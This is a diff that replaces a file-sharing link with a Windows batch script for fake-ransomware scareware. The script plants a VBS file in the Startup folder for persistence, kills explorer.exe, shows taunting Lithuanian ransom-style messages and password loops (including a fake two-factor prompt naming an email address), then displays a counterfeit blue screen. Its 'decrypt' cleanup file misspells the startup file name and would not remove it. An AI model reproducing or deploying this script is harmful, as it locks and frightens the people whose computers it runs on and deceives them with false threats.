@@ -1,1 +1,100 @@
-https://mega.nz/file/FiEyXRoR#BEPvFWNxrmW6M6f7_z0d9la5P_NguoaMl8r7EoMO22o
+@echo off
+echo Set x = CreateObject("Wscript.Shell") > "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo. >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo x.run"taskkill /f /im explorer.exe"
+echo. >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo MsgBox"CRITICAL ERROR " >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo MsgBox"Pizda tu duhas dabar pas mane tavo failai! Taimeris nustatitas ant 1min jeigu neirasysi koduka bus labai blogai :)" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo MsgBox"Nu tipo spausk OK" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo MsgBox"Timer set to 1 Minute." >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo Do >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo key = InputBox ("Kodukas...") >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo Loop Until key = "Kodukas" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo. >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo Do >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo MsgBox"Galvojai bus lengva?" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo key = InputBox ("Kodukassss") >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo Loop Until key = "adas123" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo. >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo MsgBox"Kas buvo?" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo Do >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo key = InputBox ("Paskutini karta") >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo Loop Until key = "fox223" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo. >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo MsgBox"Nu ka..." >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo MsgBox"Tipo viskas" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo MsgBox"Ar patiko?" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo MsgBox"Tipo jo?" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo MsgBox"Plaki Plaki?" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo Do >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo key = InputBox ("Two Factor Auth Please enter code that sent to ArturasZemaitinis256@gmail.com") >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo Loop Until key = "807113456" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo. >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo MsgBox"Nu ka..." >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo MsgBox"Jopta..." >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo MsgBox"Go dar viena karta?" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo MsgBox"Nu kaip nori..." >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+
+echo x.run"explorer.exe" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+
+echo @echo off >> "%HomePath%\Desktop\decrypt.cmd"
+
+echo del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\ecrypt_window.vbs" >> "%HomePath%\Desktop\decrypt.cmd"
+
+
+:VBSDynamicBuild
+SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
+IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
+ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >> "%TempVBSFile%"
+ECHO Wscript.Sleep 900 >> "%TempVBSFile%"
+ECHO WshShell.SendKeys "{F11}" >> "%TempVBSFile%"
+ECHO Wscript.Sleep 900 >> "%TempVBSFile%"
+
+CSCRIPT //nologo "%TempVBSFile%"
+
+cls
+color 17
+
+echo          A problem has been detected and Windows has been shut down to prevent damage
+
+echo          to your computer.
+
+echo.
+
+echo          The problem seems to be caused by the following file: SPCMDCON.SYS
+
+echo.
+
+echo          PAGE_FAULT_IN_NONPAGED_AREA
+
+echo.
+
+echo          If this is the first time you've seen this stop error screen,
+
+echo          restart your computer. If this screen appears again, follow
+
+echo          these steps:
+
+echo. 
+
+echo          Check to make sure any new hardware or software is properly installed.
+
+echo          If this is a new installation, ask your hardware or software manufacturerecho for any Windows updates you might need.
+
+echo.
+ 
+echo          If problems continue, disable or remove any newly installed hardware
+
+echo          or software. Disable BIOS memory options such as caching or shadowing.
+
+echo          If you need to use Safe Mode to remove or disable components, restartecho your computer, press F8 to select Advanced Startup Options, and thenecho select Safe Mode.
+
+echo.
+
+echo          Technical information:
+
+echo.
+echo          *** STOP: 0x00000050 (0xFD3094C2,0x00000001,0xFBFE7617,0x00000000)echo.echo.echo *** SPCMDCON.SYS - Address FBFE7617 base at FBFE5000, DateStamp 3d6dd67c
+pause >nul
+
+wscript "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
